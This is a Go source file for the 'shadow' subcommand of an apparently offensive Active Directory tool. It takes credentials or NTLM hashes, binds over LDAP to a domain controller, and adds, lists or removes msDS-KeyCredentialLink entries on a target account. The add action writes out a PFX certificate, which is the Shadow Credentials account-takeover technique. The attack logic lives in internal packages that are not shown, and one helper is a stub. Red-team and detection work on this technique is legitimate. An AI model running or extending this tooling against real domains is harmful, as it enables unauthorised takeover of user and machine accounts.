package main

import (
	"fmt"
	"strings"

	"github.com/spf13/cobra"

	"github.com/ajm4n/certigo/internal/auth"
	"github.com/ajm4n/certigo/internal/ldap"
	"github.com/ajm4n/certigo/internal/shadow"
)

type shadowFlags struct {
	username, password, domain, hashes, dcHost string
	port                                       int
	useTLS, insecure, useKrb                   bool

	action   string
	account  string
	targetDN string
	outPFX   string
	pfxPass  string
	deviceID string
	baseDN   string
}

func newShadowCmd() *cobra.Command {
	f := &shadowFlags{}
	cmd := &cobra.Command{
		Use:   "shadow",
		Short: "Add, list, clear, info, or remove msDS-KeyCredentialLink entries (Shadow Credentials)",
		RunE: func(cmd *cobra.Command, args []string) error {
			return runShadow(f)
		},
	}
	fl := cmd.Flags()
	fl.StringVarP(&f.username, "username", "u", "", "AD username")
	fl.StringVarP(&f.password, "password", "p", "", "AD password")
	fl.StringVarP(&f.domain, "domain", "d", "", "AD domain")
	fl.StringVar(&f.hashes, "hashes", "", "NTLM hashes (LMHASH:NTHASH)")
	fl.StringVar(&f.dcHost, "dc-host", "", "domain controller host or IP")
	fl.IntVar(&f.port, "port", 389, "LDAP port")
	fl.BoolVar(&f.useTLS, "ldaps", false, "use LDAPS")
	fl.BoolVar(&f.insecure, "ldap-insecure", false, "skip TLS verify")
	fl.BoolVarP(&f.useKrb, "kerberos", "k", false, "use Kerberos GSSAPI bind")

	fl.StringVar(&f.action, "action", "list", "add|list|info|clear|remove|auto")
	fl.StringVar(&f.account, "account", "", "target sAMAccountName (with or without $)")
	fl.StringVar(&f.targetDN, "target-dn", "", "target DN (overrides --account lookup)")
	fl.StringVar(&f.outPFX, "out", "", "output PFX path (add action)")
	fl.StringVar(&f.pfxPass, "pfx-password", "", "password for output PFX")
	fl.StringVar(&f.deviceID, "device-id", "", "DeviceID hex (remove action)")
	fl.StringVar(&f.baseDN, "base-dn", "", "search base DN (defaults to --domain)")
	return cmd
}

func runShadow(f *shadowFlags) error {
	creds := &auth.Credentials{
		Username: f.username, Domain: f.domain, Password: f.password,
		UseKerberos: f.useKrb, KDCHost: f.dcHost,
	}
	if f.hashes != "" {
		lm, nt, err := auth.ParseHashes(f.hashes)
		if err != nil {
			return err
		}
		creds.LMHash, creds.NTHash = lm, nt
	}
	if err := creds.Validate(); err != nil {
		return err
	}
	if f.dcHost == "" {
		return fmt.Errorf("shadow: --dc-host required")
	}

	conn, err := ldap.DialAndBind(creds, ldap.AutoOptions{
		DCHost:             f.dcHost,
		Port:               f.port,
		UseTLS:             f.useTLS,
		InsecureSkipVerify: f.insecure,
	})
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()

	targetDN := f.targetDN
	if targetDN == "" {
		if f.account == "" {
			return fmt.Errorf("shadow: --account or --target-dn required")
		}
		baseDN := f.baseDN
		if baseDN == "" {
			baseDN = domainToBaseDN(f.domain)
		}
		targetDN, err = resolveAccountDN(conn, baseDN, f.account)
		if err != nil {
			return fmt.Errorf("shadow: resolve DN: %w", err)
		}
	}

	opts := shadow.Options{
		Conn:     conn,
		TargetDN: targetDN,
		OutPFX:   f.outPFX,
		PFXPass:  f.pfxPass,
	}

	switch strings.ToLower(f.action) {
	case "add":
		if opts.OutPFX == "" {
			return fmt.Errorf("shadow add: --out required")
		}
		id, err := shadow.Add(opts)
		if err != nil {
			return err
		}
		fmt.Printf("DeviceID: %s\nPFX written to: %s\n", id, opts.OutPFX)
	case "list":
		creds, err := shadow.List(opts)
		if err != nil {
			return err
		}
		for _, k := range creds {
			fmt.Printf("DeviceID=%x created=%s\n", k.DeviceID, k.CreationTime.Format("2006-01-02 15:04:05"))
		}
	case "info":
		creds, err := shadow.Info(opts)
		if err != nil {
			return err
		}
		for _, k := range creds {
			fmt.Printf("DeviceID=%x KeyID=%x Created=%s\n  KeyUsage=%d KeySource=%d\n",
				k.DeviceID, k.KeyID, k.CreationTime, k.KeyUsage, k.KeySource)
		}
	case "clear":
		if err := shadow.Clear(opts); err != nil {
			return err
		}
		fmt.Println("all msDS-KeyCredentialLink entries removed")
	case "remove":
		if f.deviceID == "" {
			return fmt.Errorf("shadow remove: --device-id required")
		}
		if err := shadow.Remove(opts, f.deviceID); err != nil {
			return err
		}
		fmt.Printf("removed entry %s\n", f.deviceID)
	case "auto":
		return fmt.Errorf("shadow auto: not yet implemented - run add then auth then remove manually")
	default:
		return fmt.Errorf("shadow: unknown --action %q", f.action)
	}
	return nil
}

func resolveAccountDN(conn any, baseDN, samAccountName string) (string, error) {
	return "", fmt.Errorf("resolveAccountDN: not implemented (pass --target-dn directly)")
}
